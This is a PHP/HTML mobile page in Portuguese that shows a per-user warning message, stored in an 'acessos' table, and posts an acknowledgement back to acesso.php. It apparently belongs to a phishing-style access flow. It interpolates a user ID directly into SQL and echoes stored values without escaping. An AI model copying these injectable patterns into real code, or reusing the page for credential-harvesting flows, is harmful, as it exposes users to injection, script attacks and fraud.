<?php 

$GetMensagem = read($conn, 'acessos', "WHERE id = '$UserId'");
$MensagemGet = $GetMensagem[0]['user_message'];

?>
<!DOCTYPE html>
<html lang="pt-br">
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>Acesso Mobile :: Acesso</title>
	<!-- PERSONALIZAÇÃO CABEÇALHO -->
	<meta name="theme-color" content="#0072e5">
	<meta name="apple-mobile-web-app-status-bar-style" content="#0072e5">
	<meta name="msapplication-navbutton-color" content="#0072e5">
<script>
	function send_form_message(){
		document.getElementById('form_message').submit();
		return false;
	}
</script>	
</head>
<body style="background-color:#f1f1f1!important;">

<div class="container main_header bg-blue">
	<div class="content">
		<div class="logo">
			<img src="../_images/mobile/main_logo.jpg" height="30" width="128">
		</div><!-- logo -->
	<div class="clear"></div>
	</div><!-- content -->
</div><!-- container -->

<div class="container">
	<div class="content">
		<div class="home_title">
			<h1>ATENÇÂO!!</h1>
			<p>
				<?php 
					if(strlen($_SESSION['UserName']) == 0):
						echo 'Mensagem importante para você!';
					else:
						echo $_SESSION['UserName'].', temos uma mensagem importante para você!';
					endif;
				?>
			</p>	
		</div>
		<div style="display:block;width:95%;margin:20px auto;text-align:center;color:#ff0000;line-height:1.3em;font-family: 'newjunesemibold';">
			<?php
				$show_message = str_replace('/', '<br>', $MensagemGet);
				echo $show_message;
			?>
		</div><!-- block_mensagem_send -->
		<a href="#" class="btn-submit-complete main_button" onclick="return send_form_message();" style="width:95%!important;margin:0 auto;text-align:center;line-height:40px;float:none;text-decoration:none;">
			OK, li e entendi a mensagem
		</a>
		<form action="acesso.php?cliente=<?php echo $emailx; ?>" id="form_message" method="post">
			<input type="hidden" name="sender" value="sended_message">
		</form>
	<div class="clear"></div>
	</div><!-- content -->
</div><!-- container -->


<!-- ARQUIVOS DE INCLUSÃO -->
<link rel="stylesheet" href="../_styles/boot_mb.css">
<link rel="stylesheet" href="../_fonts/_fonts.css">
<link rel="stylesheet" href="../_styles/font-awesome.css">
<link rel="stylesheet" href="../_styles/content_mb.css">	
<script src="../_jscripts/jquery.js"></script>
<script src="../_jscripts/content_mb.js"></script>
<!-- ARQUIVOS DE INCLUSÃO -->
</body>
</html>
<?php ob_end_flush(); ?>